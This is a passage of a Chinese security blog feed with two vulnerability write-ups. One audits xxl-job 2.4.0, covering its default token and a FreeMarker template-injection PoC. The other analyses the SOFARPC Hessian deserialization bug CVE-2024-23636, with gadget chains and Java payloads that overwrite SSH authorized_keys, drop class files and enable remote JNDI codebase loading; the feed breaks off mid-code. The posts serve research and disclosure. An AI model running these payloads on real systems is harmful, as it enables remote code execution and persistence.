    <content type="html"><![CDATA[<h2 id="xxljob-2-4-0-代码审计"><a href="#xxljob-2-4-0-代码审计" class="headerlink" title="xxljob-2.4.0 代码审计"></a>xxljob-2.4.0 代码审计</h2><p><img src="68747470733a2f2f7777772e78757875656c692e636f6d2f646f632f7374617469632f78786c2d6a6f622f696d616765732f78786c2d6c6f676f2e6a7067.jpeg" alt="img"></p><h3 id="0x01-一些需要的知识"><a href="#0x01-一些需要的知识" class="headerlink" title="0x01 一些需要的知识"></a>0x01 一些需要的知识</h3><p>​XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。本次主要针对xxl-job的调度流程。</p><p><img src="v2-77c0beede344064305e9fc39b46cb07b_720w.webp" alt="img"></p><p><img src="v2-00df2ceeb5cd6ac329dbc526cedef0fa_720w.webp" alt="img"></p><h3 id="0x02-xxljob主要使用的api"><a href="#0x02-xxljob主要使用的api" class="headerlink" title="0x02 xxljob主要使用的api"></a>0x02 xxljob主要使用的api</h3><p><strong>客户端注册和执行结果上报（客户端发送给服务端）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> ReturnT&lt;String&gt; <span class="hljs-title function_">callback</span><span class="hljs-params">(List&lt;HandleCallbackParam&gt; callbackParamList)</span> &#123;<br>    <span class="hljs-keyword">return</span> XxlJobRemotingUtil.postBody(addressUrl+<span class="hljs-string">&quot;api/callback&quot;</span>, accessToken, timeout, callbackParamList, String.class);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> ReturnT&lt;String&gt; <span class="hljs-title function_">registry</span><span class="hljs-params">(RegistryParam registryParam)</span> &#123;<br>    <span class="hljs-keyword">return</span> XxlJobRemotingUtil.postBody(addressUrl + <span class="hljs-string">&quot;api/registry&quot;</span>, accessToken, timeout, registryParam, String.class);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> ReturnT&lt;String&gt; <span class="hljs-title function_">registryRemove</span><span class="hljs-params">(RegistryParam registryParam)</span> &#123;<br>    <span class="hljs-keyword">return</span> XxlJobRemotingUtil.postBody(addressUrl + <span class="hljs-string">&quot;api/registryRemove&quot;</span>, accessToken, timeout, registryParam, String.class);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-registry：注册客户端信息"><a href="#1-registry：注册客户端信息" class="headerlink" title="1 &#x2F;registry：注册客户端信息"></a>1 &#x2F;registry：注册客户端信息</h4><p>启动线程定时注册自己的服务到调度器；</p><p>创建线程，30s轮询一次，上报注册信息。</p><h4 id="2-registryRemove：移出执行器请求"><a href="#2-registryRemove：移出执行器请求" class="headerlink" title="2 &#x2F;registryRemove：移出执行器请求"></a>2 &#x2F;registryRemove：移出执行器请求</h4><p>将自己从执行器列表移除；</p><p>程序退出时会调用一次，在Netty的finally代码块自动执行。</p><h4 id="3-callback：异步回调结果"><a href="#3-callback：异步回调结果" class="headerlink" title="3 &#x2F;callback：异步回调结果"></a>3 &#x2F;callback：异步回调结果</h4><p>执行器异步回调给调度器执行任务结果；</p><p>每次任务完成时上报。</p><h4 id="4-对应的数据形式"><a href="#4-对应的数据形式" class="headerlink" title="4 对应的数据形式"></a>4 对应的数据形式</h4><p><strong>（1）客户端注册</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//127.0.0.1:8080/xxl-job-admin/api/registry</span><br>&#123;<br>    <span class="hljs-string">&quot;registryGroup&quot;</span>: <span class="hljs-string">&quot;EXECUTOR&quot;</span><br>    <span class="hljs-string">&quot;registryKey&quot;</span>: <span class="hljs-string">&quot;xxl-job-executor-sample&quot;</span><br>    <span class="hljs-string">&quot;registryValue&quot;</span>: <span class="hljs-string">&quot;http://172.30.0.67:9999/&quot;</span><br>&#125;<br><br>Response:<br>&#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span><br>    <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">null</span><br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-literal">null</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>（2）客户端移除注册</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//127.0.0.1:8080/xxl-job-admin/api/registryRemove</span><br>&#123;<br>    <span class="hljs-string">&quot;registryGroup&quot;</span>: <span class="hljs-string">&quot;EXECUTOR&quot;</span><br>    <span class="hljs-string">&quot;registryKey&quot;</span>: <span class="hljs-string">&quot;xxl-job-executor-sample&quot;</span><br>    <span class="hljs-string">&quot;registryValue&quot;</span>: <span class="hljs-string">&quot;http://xxljob-axzo.cn&quot;</span><br>&#125;<br><br>Response:<br>&#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span><br>    <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">null</span><br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-literal">null</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>（3）客户端执行任务结果上报</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//127.0.0.1:8080/xxl-job-admin/api/callback</span><br>&#123;<br>    <span class="hljs-string">&quot;logId&quot;</span>: <span class="hljs-number">1238</span><br>    <span class="hljs-string">&quot;logDateTim&quot;</span>: <span class="hljs-number">1667197980007</span><br>    <span class="hljs-string">&quot;handleCode&quot;</span>: <span class="hljs-number">200</span><br>&#125;<br><br>Response:<br>&#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span><br>    <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">null</span><br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-literal">null</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>（4）执行器下发任务：同步回调仅代表任务是否发送成功</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//172.30.0.67:9999/run</span><br>&#123;<br>    <span class="hljs-string">&quot;jobId&quot;</span>: <span class="hljs-number">4</span><br>    <span class="hljs-string">&quot;executorHandler&quot;</span>: <span class="hljs-string">&quot;demoJobHandler&quot;</span><br>    <span class="hljs-string">&quot;executorParams&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-string">&quot;executorBlockStrategy&quot;</span>: <span class="hljs-string">&quot;SERIAL_EXECUTION&quot;</span><br>    <span class="hljs-string">&quot;executorTimeout&quot;</span>: <span class="hljs-number">0</span><br>    <span class="hljs-string">&quot;logId&quot;</span>: <span class="hljs-number">1238</span><br>    <span class="hljs-string">&quot;logDateTime&quot;</span>: <span class="hljs-number">1667197980007</span><br>    <span class="hljs-string">&quot;glueType&quot;</span>: <span class="hljs-string">&quot;BEAN&quot;</span><br>    <span class="hljs-string">&quot;glueSource&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-string">&quot;glueUpdatetime&quot;</span>: <span class="hljs-number">1666683613000</span><br>    <span class="hljs-string">&quot;broadcastIndex&quot;</span>: <span class="hljs-number">0</span><br>    <span class="hljs-string">&quot;broadcastTotal&quot;</span>: <span class="hljs-number">1</span><br>&#125;<br><br>Response:<br>&#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span><br>    <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">null</span><br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-literal">null</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-Token配置详解"><a href="#5-Token配置详解" class="headerlink" title="5 Token配置详解"></a>5 Token配置详解</h4><p>1.配置了token后，client发送的每隔http请求头会带上XXL-JOB-ACCESS-TOKEN ：{xxl.job.accessToken} ；</p><p>2.该参数不会对请求参数加密；</p><p>3.如果配置不匹配，客户端请求报错：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br><span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">500</span><br><span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;The access token is wrong.&quot;</span><br><span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-literal">null</span><br>&#125;<br></code></pre></td></tr></table></figure><p>​<img src="image-20240220201211776.png" alt="image-20240220201211776"></p><p>默认为default_token</p><h3 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03  代码分析"></a>0x03  代码分析</h3><p>​本次主要针对注册器的代码进行审计。</p><p><img src="image-20240220201858316.png" alt="image-20240220201858316"></p><p>客户端使用xxl-job-core</p><p>在这个com.xxl.job.core工具类里用一个可以利用的点。</p><p>com&#x2F;xxl&#x2F;job&#x2F;core&#x2F;util&#x2F;JdkSerializeTool.java 反序列化</p><p><img src="image-20240220202223069.png" alt="image-20240220202223069"></p><p>可控而且是public。</p><p>com&#x2F;xxl&#x2F;job&#x2F;core&#x2F;util&#x2F;ScriptUtil.java   写文件，执行命令</p><p><img src="image-20240220202439049.png" alt="image-20240220202439049">z</p><p><img src="image-20240220202446553.png" alt="image-20240220202446553"></p><p>com&#x2F;xxl&#x2F;job&#x2F;core&#x2F;util&#x2F;FileUtil.java</p><p><img src="image-20240220202703421.png" alt="image-20240220202703421"></p><p>等等。都是可以直接调用。</p><p>很容易可以想到利用方式就是写文件，或者代码执行，任意文件删除。</p><p><img src="image-20240220205604031.png" alt="image-20240220205604031"></p><p>xxljob使用了freemarker模版进行渲染，渲染路径为classpath下的&#x2F;templates&#x2F;</p><p><img src="image-20240220205912442.png" alt="image-20240220205912442"></p><p>freemarker版本是2.3.32，也就是说通过文件写入恶意的模版文件，就能造成代码执行。</p><p><img src="image-20240220214644221.png" alt="image-20240220214644221"></p><p>全局拦截器的代码，</p><p><img src="image-20240220214707275.png" alt="image-20240220214707275"></p><p>对应的实现类。</p><p><img src="image-20240220214841612.png" alt="image-20240220214841612"></p><p>或者这个，然后判读用户</p><p><img src="image-20240220215457794.png" alt="image-20240220215457794"></p><p>进行16进制处理。</p><p><img src="image-20240220215549379.png" alt="image-20240220215549379"></p><p><img src="image-20240220215615914.png" alt="image-20240220215615914"></p><p>然后判断用户是否存在，若果存在，在继续判断密码的md5值是否等于数据里对应的值。看来是无法绕过拦截器的。这样看来其实，token也是一个隐患，永不过期，嗅探到数据包，也是可以永久使用。</p><h3 id="0x04-复现"><a href="#0x04-复现" class="headerlink" title="0x04 复现"></a>0x04 复现</h3><p>poc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?new()(<span class="hljs-string">&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;</span>).parseExpression(<span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;open -a calculator\&quot;)&quot;</span>).getValue()&#125;</span><br></code></pre></td></tr></table></figure><p><img src="image-20240220210430937.png" alt="image-20240220210430937"></p><p>执行后修改了登录页的模版。再次打开就能造成代码执行。</p><p><img src="image-20240220210722090.png" alt="image-20240220210722090"></p><p>当然利用9999默认token也是可以的。</p><p><img src="image-20240220213846313.png" alt="image-20240220213846313"></p><p><img src="image-20240220213904413.png" alt="image-20240220213904413"></p><p>这里直接使用反射获取classloader去加载内存马，注意，这里可以使用jMG v1.0.7.beta3生成的马子，端口为8081，但是实战中，8081这个端口基本不存在，只有9999端口实战可利用，所以需要打netty的内存马。本质上攻击的是注册器（client），xxljob是注册中心（server）,也有情况，server，client在一台机器上。</p><p><img src="image-20240220221245756.png" alt="image-20240220221245756"></p><p>这个马子实战鸡肋。</p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>​没什么用，主要还是利用默认的token去更改一些配置。而且，本来就可以自定义代码，想怎么写就怎么写，所以用不用core里面的工具类也无上大雅。直接使用反射获取classloader去加载内存马就可以，或者直接执行shell脚本就行。这个修改模版很鸡肋，若果使用jar包部署，也无法去修改jar里面的classpath，鸡肋中的鸡肋，弃之可惜，鸡肋一下。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://zhuanlan.zhihu.com/p/587813289">https://zhuanlan.zhihu.com/p/587813289</a></p><p><a href="https://github.com/pen4uin/java-memshell-generator-release">https://github.com/pen4uin/java-memshell-generator-release</a></p><p><a href="https://github.com/zema1/suo5">https://github.com/zema1/suo5</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SOFARPC反序列化漏洞（CVE-2024-23636</title>
    <link href="/2024/02/10/SOFARPC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-23636/"/>
    <url>/2024/02/10/SOFARPC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-23636/</url>
    
    <content type="html"><![CDATA[<h2 id="SOFARPC反序列化漏洞（CVE-2024-23636）浅析"><a href="#SOFARPC反序列化漏洞（CVE-2024-23636）浅析" class="headerlink" title="SOFARPC反序列化漏洞（CVE-2024-23636）浅析"></a>SOFARPC反序列化漏洞（CVE-2024-23636）浅析</h2><p>​首发于先知 <a href="https://xz.aliyun.com/t/13462">https://xz.aliyun.com/t/13462</a></p><p><img src="image-20240210093310560.png" alt="image-20240210093310560"></p><h3 id="0x01-SOFARPC简介"><a href="#0x01-SOFARPC简介" class="headerlink" title="0x01 SOFARPC简介"></a>0x01 SOFARPC简介</h3><p>​SOFARPC 是一个高性能、高扩展性、生产级的 Java RPC 框架。</p><p>​2024年1月24日，启明星辰VSRC监测到SOFARPC中修复了一个反序列化漏洞（CVE-2024-23636），该漏洞的CVSSv3评分为9.8。由于SOFARPC 默认使用 SOFA Hessian 协议来反序列化接收到的数据，而 SOFA Hessian 协议使用黑名单机制来限制危险类的反序列化。SOFARPC 版本5.12.0之前，威胁者可通过Gadget链（只依赖于JDK，不依赖任何第三方组件）绕过SOFA Hessian黑名单保护机制，导致远程代码执行。</p><h3 id="0x02-序列化分析"><a href="#0x02-序列化分析" class="headerlink" title="0x02 序列化分析"></a>0x02 序列化分析</h3><p>​sofa-rpc默认使用 SOFA Hessian 协议来反序列化接收到的数据，所以，下载源码去看对应的实现。</p><p>​对应的代码在com.alipay.sofa.rpc.codec.sofahessian这个包下面</p><p>com&#x2F;alipay&#x2F;sofa&#x2F;rpc&#x2F;codec&#x2F;sofahessian&#x2F;SofaHessianSerializer.java# encode()</p><p><img src="image-20240128231107461.png" alt="image-20240128231107461"></p><p>这里先对传入obj获取对应的serializer，若果没有获取到，就使用默认Hessian进行序列化。</p><p>com&#x2F;alipay&#x2F;sofa&#x2F;rpc&#x2F;codec&#x2F;sofahessian&#x2F;SofaHessianSerializer.java# decode()</p><p><img src="image-20240128231546627.png" alt="image-20240128231546627"></p><p><img src="image-20240128231553036.png" alt="image-20240128231553036"></p><p><img src="image-20240128231751972.png" alt="image-20240128231751972"></p><p>对应两种反序列方式，可以看到就是hessian序列化和反序列化外面套了一成。</p><p><img src="image-20240128234225056.png" alt="image-20240128234225056"></p><p>尝试一下，直接调用它的序列化，反序列化方法是能可以命令执行的。</p><p>因为直接调用它的序列化和反序列函数，是没用过黑名单的。</p><p>具体的流程就是非常短的一条链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.putVal<br>    UIDefault.equals<br>  Hashtable.equals<br>  UIDefault.get<br>  UIDefault.getFromHashtable<br>        SwingLazyValue.createValue<br></code></pre></td></tr></table></figure><p>简单说就是UIDefault它里面没有equals方法，调用它的父类的equals，然后触发UIDefault.get。完成了 only jdk的调用。</p><p><img src="image-20240128235029800.png" alt="image-20240128235029800"></p><p>这是tostring的方式。</p><h3 id="0x03-exp构造分析"><a href="#0x03-exp构造分析" class="headerlink" title="0x03  exp构造分析"></a>0x03  exp构造分析</h3><p><img src="image-20240128235158909.png" alt="image-20240128235158909"></p><p>通告里面写的org.apache.xpath这个类。</p><p><a href="https://github.com/sofastack/sofa-rpc/blob/v5.11.0/codec/codec-sofa-hessian/src/main/resources/sofa-rpc/serialize_blacklist.txt">5.11.0黑名单</a></p><p>这是5.10对应的黑名单.</p><p><img src="image-20240129000843942.png" alt="image-20240129000843942"></p><p>支队这个类做了限制。</p><p>所以很容易想到就是  com.sun.org.apache.xpath.internal.objects.XString.equal去触发toString。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.swing</span><span class="hljs-selector-class">.MultiUIDefaults</span><span class="hljs-selector-class">.toString</span><br>           UIDefaults<span class="hljs-selector-class">.get</span><br>               UIDefaults<span class="hljs-selector-class">.getFromHashTable</span><br>                   UIDefaults<span class="hljs-variable">$LazyValue</span><span class="hljs-selector-class">.createValue</span><br>                   SwingLazyValue<span class="hljs-selector-class">.createValue</span><br>                       javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.InitialContext</span><span class="hljs-selector-class">.doLookup</span>()<br></code></pre></td></tr></table></figure><p>但是5.11.1新增黑名单javax.swing.UIDefaults</p><p>所以上面的链子在小于5.11.1 是可以使用的。</p><p>5.11.1既然能触发tostring能想到的去连json的序列化触发getter。(Jackson、fastjson在目前最新版5.12也没在黑名单里)</p><p>5.12 黑名单<a href="https://github.com/sofastack/sofa-rpc/blob/v5.12.0/codec/codec-api/src/main/resources/sofa-rpc/serialize_blacklist.txt">https://github.com/sofastack/sofa-rpc/blob/v5.12.0/codec/codec-api/src/main/resources/sofa-rpc/serialize_blacklist.txt</a> 增加到了一百七十多个</p><p><img src="image-20240129013853886.png" alt="image-20240129013853886"></p><p>就是这种直接全搬掉了，但是hashmap和json没办。 就是可以找找haspmap的hashcode、equals触发toString然后触发getter。</p><h3 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h3><p>用项目里的例子起一个服务端。参考泛化调用说明可以见：<a href="https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/">https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/</a></p><p><img src="image-20240129001845905.png" alt="image-20240129001845905"></p><p>构建好exp用客户端发送payload到服务端就可以了。</p><p><img src="image-20240129002015075.png" alt="image-20240129002015075"></p><p>把黑名单替换为5.11.0的黑名单</p><p><img src="image-20240129002251587.png" alt="image-20240129002251587"></p><p>可以看到是可以攻击成功的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet.putAll<br>javax.naming.ldap.Rdn$RdnEntry.compareTo<br>    com.sun.org.apache.xpath.internal.objects.XStringForFSB.equal<br>        javax.swing.MultiUIDefaults.toString<br>            UIDefaults.get<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br>                    SwingLazyValue.createValue<br>                        javax.naming.InitialContext.doLookup()<br></code></pre></td></tr></table></figure><p>就是hessian在序列化Treemap时会触发compareTo。hessian这里就不做分析。</p><p><strong>5.11.1 本人技术有限，暂没找到原生触发</strong>。然后想到的利用方式就是tostring去触发json序列化。环境有fastjson2，jackson。</p><p>还有一条是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet.putAll<br>javax.naming.ldap.Rdn$RdnEntry.compareTo<br>    com.sun.org.apache.xpath.internal.objects.XString.equal<br>        javax.sound.sampled.AudioFileFormat.toString<br>            UIDefaults.get<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br>                    SwingLazyValue.createValue<br>                        javax.naming.InitialContext.doLookup()<br></code></pre></td></tr></table></figure><p>就换了一下中间的步骤。 看2023的那个cve遇警搬掉的就是javax.sound.sampled.AudioFileFormat。</p><p>也就是说这次的2024就是他的绕过呗。</p><h3 id="0x05-扩展一下攻击面"><a href="#0x05-扩展一下攻击面" class="headerlink" title="0x05 扩展一下攻击面"></a>0x05 扩展一下攻击面</h3><p>SwingLazyValue.createValue可以调用sun.reflect.misc.MethodUtil.invoke方法达到任意类的任意方法调用，那这就有意思了。(试了下，hessian3.x好像不能用这个，4.x可以，写了就留着吧)</p><h4 id="一、不出网就写文件"><a href="#一、不出网就写文件" class="headerlink" title="一、不出网就写文件"></a>一、不出网就写文件</h4><p>写ssh</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//            二、利用JavaUtils.writeBytesToFilename写文件</span><br>       <span class="hljs-type">byte</span>[] allBytes = Files.readAllBytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/snake/.ssh/authorized_keys&quot;</span>).toPath());<br>        Constructor&lt;?&gt; JavaUtils = JavaUtils.class.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        JavaUtils.setAccessible(<span class="hljs-literal">true</span>);<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">javaUtils</span> <span class="hljs-operator">=</span> JavaUtils.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">bytesToFilename</span> <span class="hljs-operator">=</span> JavaUtils.class.getMethod(<span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class);<br>       <span class="hljs-type">Method</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);<br>       Object[] ags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123; bytesToFilename,javaUtils,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123; <span class="hljs-string">&quot;/Users/snake/.ssh/authorized_keys1&quot;</span>,allBytes&#125;&#125;&#125;;<br><span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>,<span class="hljs-string">&quot;invoke&quot;</span>,ags);<br></code></pre></td></tr></table></figure><p>写class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;evil.class&quot;</span>).toPath());<br>SwingLazyValue swingLazyValue= <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;java.lang.System&quot;</span>,<span class="hljs-string">&quot;setProperty&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;(Object)<span class="hljs-string">&quot;jfr.save.generated.asm&quot;</span>,(Object)<span class="hljs-string">&quot;true&quot;</span>&#125;);<br>       <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;jdk.jfr.internal.Utils&quot;</span>,<span class="hljs-string">&quot;writeGeneratedASM&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;(Object)<span class="hljs-string">&quot;/tmp/evil/&quot;</span>,bytes&#125;);<br><br>打三次。 开启jfr.save.generated.asm，写class，在加载。<br></code></pre></td></tr></table></figure><h4 id="二、高版本开启jndi出网，在利用。"><a href="#二、高版本开启jndi出网，在利用。" class="headerlink" title="二、高版本开启jndi出网，在利用。"></a>二、高版本开启jndi出网，在利用。</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        三、利用RMIConnector/JdbcRowSetImpl/javax.naming.InitialContext打jndi，高版本先打下面配置，开启出网。(利用java.lang.System.setProperty开启配置)。</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">useCodebaseOnly</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;java.lang.System&quot;</span>,<span class="hljs-string">&quot;setProperty&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;(Object)<span class="hljs-string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>,(Object)<span class="hljs-string">&quot;false&quot;</span>&#125;);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">rmi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;java.lang.System&quot;</span>,<span class="hljs-string">&quot;setProperty&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;(Object)<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,(Object)<span class="hljs-string">&quot;true&quot;</span>&#125;);<br>/       <span class="hljs-type">Object</span> <span class="hljs-variable">ldap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;java.lang.System&quot;</span>,<span class="hljs-string">&quot;setProperty&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;(Object)<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,(Object)<span class="hljs-string">&quot;true&quot;</span>&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        uiDefaults.put(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>, <span 